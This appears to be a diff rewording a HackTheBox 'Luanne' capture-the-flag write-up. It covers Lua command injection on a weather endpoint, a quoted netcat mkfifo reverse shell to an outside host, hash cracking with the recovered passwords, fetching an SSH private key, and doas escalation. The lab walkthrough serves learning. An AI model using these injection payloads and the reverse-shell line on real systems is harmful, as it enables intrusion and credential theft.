@@ -6,9 +6,9 @@ points: 20
 rating: 2.7
 date: 2020-11-28
 avatar: assets/htb/luanne.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Luanne
 ---
+
 ## Useful Skills and Tools
 
 ### Decrypt `.enc` file in BSD
@@ -30,7 +30,7 @@ doas whoami
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My go-to flags are: `-p-`, a shorthand that scans every port, `-sC`, which is the same as `--script=default` and fires a batch of nmap enumeration scripts at the target, `-sV` for service detection, and `-oA <name>` to write out all three output formats \(.nmap,.gnmap, and .xml\) using the prefix `<name>`.
 
 ```bash
 ┌──(kac0㉿kali)-[~/htb/luanne]
@@ -68,45 +68,45 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1066.53 seconds
 ```
 
-Nmap only showed three ports were open on this machine: 22- SSH, 80 - HTTP, and 9001 - which said `Medusa httpd 1.12 (Supervisor process manager)`.
+Nmap reported just three open ports on the box: 22 - SSH, 80 - HTTP, and 9001 - which it identified as `Medusa httpd 1.12 (Supervisor process manager)`.
 
 ### Port 80 - HTTP
 
-I started out my enumeration by navigating to `<YOUR_IP>` in my browser.
+I began by opening `<YOUR_IP>` in my browser.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-unauth.png)
+![](assets/wu/luanne/img-1.png)
 
-I was immediately greeted by a Basic HTTP authorization prompt.  Since I didn't have any credentials I tried a few basic defaults, but no luck.
+A Basic HTTP authorization prompt popped up right away.  With no credentials in hand, I threw a handful of common defaults at it, but none worked.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-index.png)
+![](assets/wu/luanne/img-2.png)
 
-Navigating to `/index.html` brought me to a default `nginx` installation page.
+Browsing to `/index.html` landed me on a default `nginx` install page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-robots.png)
+![](assets/wu/luanne/img-3.png)
 
-There was only one disallow line in `robots.txt` that showed a directory called `/weather`. 
+`robots.txt` held a single disallow entry pointing at a directory named `/weather`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-weather.png)
+![](assets/wu/luanne/img-4.png)
 
-This did not reveal anything interesting, however.  I left `dirbuster` running while I checked out the next service.  I searched for exploits related to this version of `nginx` but only found a few denial of service vulnerabilities and a CNAME leakage.  There was nothing useful.
+That turned up nothing of note, though.  I set `dirbuster` going and moved on to the next service.  Looking up exploits for this `nginx` version only surfaced a couple of denial of service issues and a CNAME leak.  Nothing usable.
 
 ### Port 9001 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-9001.png)
+![](assets/wu/luanne/img-5.png)
 
-Navigating to the page hosted on port 9001 also gave me a Basic HTTP authentication prompt.  However, this one gave me a little clue.  I did some research on the Supervisor process manager, looking for default credentials after seeing the hint of  "default".
+The page on port 9001 also threw a Basic HTTP authentication prompt at me.  This one, though, dropped a small hint.  Spotting the word "default" in the realm, I went digging into the Supervisor process manager for default credentials.
 
 * [https://readthedocs.org/projects/supervisor/downloads/pdf/latest/](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-default.png)
+![](assets/wu/luanne/img-6.png)
 
-default seemed to be user:123 from the manual \(though it specifies none:none\)
+the manual suggested the default was user:123 \(even though it states none:none\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-supervisor-status.png)
+![](assets/wu/luanne/img-7.png)
 
-after logging in I had a supervisor-status page that showed what appeared to be running processes on the server
+once logged in I landed on a supervisor-status page listing what looked like the server's running processes
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7.5-processes.png)
+![](assets/wu/luanne/img-8.png)
 
 ```bash
 USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
@@ -133,43 +133,41 @@ root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/
 root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
 ```
 
-I saw a cron in the process output, as well as a weather.lua
+The process listing showed a cron entry along with a weather.lua
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-no-exec.png)
+![](assets/wu/luanne/img-9.png)
 
-I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.
+I poked at it for local file inclusion and code execution, but all I got back were errors.
 
 ### Port 80 - `/weather/forecast/`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9.5-weather-forecast.png)
+![](assets/wu/luanne/img-10.png)
 
-I found a directory `/weather/forecast/` using Dirbuster.
+Dirbuster turned up a `/weather/forecast/` directory.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-weather-forecast.png)
+![](assets/wu/luanne/img-11.png)
 
 "No city specified. Use 'city=list' to list available cities."
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-weather-test.png)
+![](assets/wu/luanne/img-12.png)
 
-'test' showed unknown city error
+supplying 'test' returned an unknown city error
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-lua-error.png)
+![](assets/wu/luanne/img-13.png)
 
-Sending a query of `'` \(single quote\) resulted in a "nil value" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.
+Passing a `'` \(single quote\) as the query produced a "nil value" Lua error.  I had been aiming to test for SQL injection, but this pointed somewhere else.  So I read up on Lua syntax to work out how to coax it into running code.
 
 * [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-noscript-xss-warning.png)
+![](assets/wu/luanne/img-14.png)
 
-My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')`, separate the commands with a `;`, and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.
+My first try set off a NoScript warning about a potential XSS attack.  To reach that point I had to terminate the function arguments with `')`, split the statements with a `;`, and cap the injection with a Lua comment `--`.  Even so, I still wasn't getting code execution.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-lua-code-exec.png)
+![](assets/wu/luanne/img-15.png)
 
- Looking a bit closer at my attempt, I noticed that I had typed `os.system('id')` rather than `os.execute('id')` which NoScript saw as JavaScript, triggering that warning.  Fixing this error allowed me to get command execution. 
+ On a closer look at what I had sent, I realized I'd written `os.system('id')` instead of `os.execute('id')`, and NoScript had read that as JavaScript, hence the warning.  Correcting the mistake gave me command execution. 
 
-{% hint style="info" %}
-NoScript still caught the attempt using **`os.execute`**, but at least it drew my attention to my error the first time!
-{% endhint %}
+NoScript still flagged the **`os.execute`** request, but at least its first warning had tipped me off to the typo!
 
 ```bash
 root:*:0:0:Charlie &:/root:/bin/sh
@@ -202,21 +200,21 @@ nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
 dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
 ```
 
-Using this command execution I pulled `/etc/passwd` to enumerate the users on the machine.  There were only two users who could login with a shell, `root` and `r.michaels`.  
+With command execution in hand I dumped `/etc/passwd` to list the machine's users.  Only two of them had a login shell: `root` and `r.michaels`.  
 
 ```text
 NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
 ```
 
-The command `uname -a` revealed this to be a NetBSD system.  I wasn't sure what kind of reverse shell would work on a BSD system, so I checked the one-stop-shop for all things Payload.
+Running `uname -a` confirmed this was a NetBSD host.  Unsure which reverse shell would behave on a BSD system, I turned to the one-stop-shop for all things Payload.
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md\#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
 
 > `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-reverse-shell.png)
+![](assets/wu/luanne/img-16.png)
 
-I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.  The response hung for awhile after sending, which was a good sign.
+I grabbed an nc-based reverse shell \(without -e\) meant for openbsd, betting it would work on this distro too.  After I sent it the response hung for a while, a promising sign.
 
 ## Initial Foothold
 
@@ -235,7 +233,7 @@ uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
 luanne.htb
 ```
 
-It worked!
+And it landed!
 
 ### Enumeration as `_httpd`
 
@@ -244,7 +242,7 @@ $ which python3
 which: PATH environment variable is not set
 ```
 
-Checked to see if python3 was installed, but got an error that the PATH was not set. After some testing I found that my usual TTY upgrades were not working.
+I checked whether python3 was present, but hit an error saying PATH was unset. Testing further, I discovered my usual TTY upgrade tricks weren't working.
 
 ```text
 $ pwd
@@ -260,7 +258,7 @@ $ cat .htpasswd
 webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
 ```
 
-found an MD5 hash in `.htpasswd`
+`.htpasswd` held an MD5 hash
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/luanne]
@@ -310,15 +308,15 @@ Started: Sat Mar 27 20:11:43 2021
 Stopped: Sat Mar 27 20:11:48 2021
 ```
 
-It cracked within seconds to reveal the password `iamthebest`.
+Within seconds it fell, exposing the password `iamthebest`.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-webapi.png)
+![](assets/wu/luanne/img-17.png)
 
-I was able to use this to log into the other web portal on port 80.
+Those credentials got me into the other web portal on port 80.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-webapi.png)
+![](assets/wu/luanne/img-18.png)
 
-There did not seem to be anything further I could do here other than discover the `/weather/forecast/` endpoint I had already used to gain access to the machine.
+Beyond the `/weather/forecast/` endpoint I'd already abused to get on the box, there didn't seem to be anything more to do here.
 
 ## Road to User
 
@@ -346,7 +344,7 @@ $ find / -user r.michaels 2>/dev/null
 /home/r.michaels
 ```
 
-Since I only had one user to go off, I tried using that password to switch users to `r.michaels` but failed.  I also tried finding everything that `r.michaels` had access to, but there wasn't much.
+With just the one user to work with, I tried reusing that password to su to `r.michaels`, but it didn't take.  I also enumerated everything `r.michaels` owned, but there was little to find.
 
 ```text
 $ ls -la /home/r.michaels
@@ -355,7 +353,7 @@ $ ls -la /var/mail/r.michaels
 -rw-------  1 r.michaels  wheel  9172 Sep 16  2020 /var/mail/r.michaels
 ```
 
-I tried to see what was in those directories, but couldn't see anything I could access.
+I attempted to read those directories, but nothing was accessible to me.
 
 ```text
 $ ps -auxw
@@ -391,11 +389,9 @@ root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/
 root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
 ```
 
-There was a process run by the `r.michaels` user that seemed to be running another instance of the `weather.lua`, this time on port 3001.
+One process owned by `r.michaels` appeared to be a second `weather.lua` instance, this one bound to port 3001.
 
-{% hint style="info" %}
-Note: From other user's attempts from the process output I saw one that showed**`python3.7 -c import pty;pty.spawn("/bin/sh")`**. You may be able to use this to upgrade your shell. I didn't notice this until after I was done, and it would have been metagaming anyways!
-{% endhint %}
+Note: Among other players' attempts in the process output I spotted one running**`python3.7 -c import pty;pty.spawn("/bin/sh")`**. That could let you upgrade your shell. I only caught it after I'd finished, and it would have been metagaming anyway!
 
 ```text
 $ curl http://localhost:3001
@@ -409,7 +405,7 @@ $ curl http://localhost:3001
 </body></html>
 ```
 
-I tried using curl to get the local page at 3001 and got a "No Authorization" error.
+Curling the local page on 3001 returned a "No Authorization" error.
 
 ```text
 $ curl -u webapi_user:iamthebest http://localhost:3001
@@ -432,7 +428,7 @@ $ curl -u webapi_user:iamthebest http://localhost:3001
 </html>
 ```
 
-since this page was the same as the one on port 80 I tried logging in as `webapi_user`.  This time I was able to retrieve the site.  It looked exactly the same as the one on port 80.
+since this matched the port 80 page, I authenticated as `webapi_user`.  That time the site came back, looking identical to the one on port 80.
 
 ```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/r.michaels
@@ -455,9 +451,9 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~/
 </body></html>
 ```
 
-I tried to see if I could access the home directory since this process was being run as 
+I wanted to check whether I could reach the home directory, given the process was running as 
 
-searched for how to access home directory in a URL and found
+I looked up how to reference a home directory in a URL and came across
 
 * [https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl](https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl)
 * [https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths](https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths)
@@ -475,11 +471,11 @@ This document had moved <a href="http://localhost:3001/~r.michaels/">here</a>
 </body></html>
 ```
 
-The post was related to python, but it seemed to work, at least somewhat
+The post was about python, but the approach worked, at least partly
 
 * [https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/](https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/)
 
-it seems like the tilde thing is also used specifically in nginx
+it turns out the tilde syntax is also used specifically by nginx
 
 ```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/
@@ -508,9 +504,9 @@ tr:nth-child(even) { background: lavender; }
 </body></html>
 ```
 
-Putting the trailing slash on the url caused it to give me a directory listing
+Appending a trailing slash to the url made it return a directory listing
 
-id\_rsa sounded quite interesting
+an id\_rsa file definitely caught my eye
 
 ```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa
@@ -526,7 +522,7 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa/
 </body></html>
 ```
 
-However, trying to retrieve the `id_rsa` file gave some errors.
+Fetching the `id_rsa` file itself, however, threw errors.
 
 ```text
 $ curl -u webapi_user:iamthebest ftp://localhost:3001/~r.michaels/id_rsa
@@ -536,7 +532,7 @@ $ curl -u webapi_user:iamthebest ftp://localhost:3001/~r.michaels/id_rsa
 curl: (56) response reading failed
 ```
 
-Next I tried switching protocols to use ftp:// rather than http:// but that failed as well
+I then swapped the protocol to ftp:// instead of http://, but that failed too
 
 ### Further enumeration
 
@@ -587,7 +583,7 @@ QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-I was finally able to get it by removing the specification for curl to interpret what it was pulling through the HTTP protocol
+I finally pulled it down by dropping the bit that told curl to interpret what it was retrieving over the HTTP protocol
 
 ### User.txt
 
@@ -621,7 +617,7 @@ luanne$ cat user.txt
 ea5f************************ebc0
 ```
 
-got the user.txt flag
+and grabbed the user.txt flag
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -632,7 +628,7 @@ luanne$ groups r.michaels
 users
 ```
 
-`r.michaels` was only a member of the users group
+`r.michaels` belonged only to the users group
 
 ```text
 luanne$ cd backups/                                                                                   
@@ -643,7 +639,7 @@ dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
 -r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
 ```
 
-In the `/backups` folder there was an encrypted tar file.  Searching for netbsd tar.gz.enc led to
+The `/backups` folder contained an encrypted tar file.  A search for netbsd tar.gz.enc pointed me to
 
 * [https://man.netbsd.org/netpgp.1](https://man.netbsd.org/netpgp.1)
 
@@ -655,7 +651,7 @@ uid              RSA 2048-bit key <r.michaels@localhost>
 tar: Error opening archive: Failed to open '/dev/nrst0'
 ```
 
-looks like 2048 bit rsa key
+appears to be a 2048 bit rsa key
 
 * [https://man.netbsd.org/tar.1](https://man.netbsd.org/tar.1)
 * [https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work](https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work)
@@ -667,7 +663,7 @@ Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
 uid              RSA 2048-bit key <r.michaels@localhost>
 ```
 
-success
+that did it
 
 ```text
 luanne$ ls -ls /tmp
@@ -682,7 +678,7 @@ drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
 drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
 ```
 
-I was able to successfully extract the files, but right after I started to look through them the `/tmp` directory was cleaned up.
+The extraction succeeded, but just as I began browsing the files the `/tmp` directory got wiped.
 
 ```text
 luanne$ ls -la
@@ -708,7 +704,7 @@ luanne$ cat .htpasswd
 webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
 ```
 
-I noticed that this hash was different from the one I had cracked earlier.
+This hash was clearly different from the one I'd cracked before.
 
 ```text
 luanne$ cat index.html                                                                                
@@ -728,7 +724,7 @@ luanne$ cat index.html
 </html>
 ```
 
-This `index.html` was the same as the `/forecast` site I had seen earlier, however.
+This `index.html`, though, matched the `/forecast` site I'd seen earlier.
 
 ```text
 luanne$ cd ../webapi/                                                                                 
@@ -739,7 +735,7 @@ drwxr-x---  4 r.michaels  wheel    96 Sep 16  2020 ..
 -rw-r--r--  1 r.michaels  wheel  7072 Sep 16  2020 weather.lua
 ```
 
-The `webapi` folder only contained the file `weather.lua`
+The only file in the `webapi` folder was `weather.lua`
 
 ```lua
 luanne$ cat weather.lua                                                                               
@@ -806,7 +802,7 @@ end
 httpd.register_handler('forecast', forecast)
 ```
 
-Nothing useful here? There did seem to be a backdoor potentially written in, though it was commented out `-- city=London') os.execute('id') --`. I think this is where I injected my original access
+Nothing useful here? There did look to be a possible backdoor baked in, albeit commented out `-- city=London') os.execute('id') --`. I'm guessing this is the spot where my original injection landed
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/luanne]
@@ -859,7 +855,7 @@ Started: Sat Mar 27 23:58:51 2021
 Stopped: Sat Mar 27 23:58:54 2021
 ```
 
-The hash cracked almost immediately, finding a password of `littlebear`
+The hash broke almost at once, yielding the password `littlebear`
 
 ```text
 luanne$ doas whoami
@@ -867,7 +863,7 @@ Password:
 root
 ```
 
-I was able to run commands with `doas` with this password!
+That password let me run commands via `doas`!
 
 ### Root.txt
 
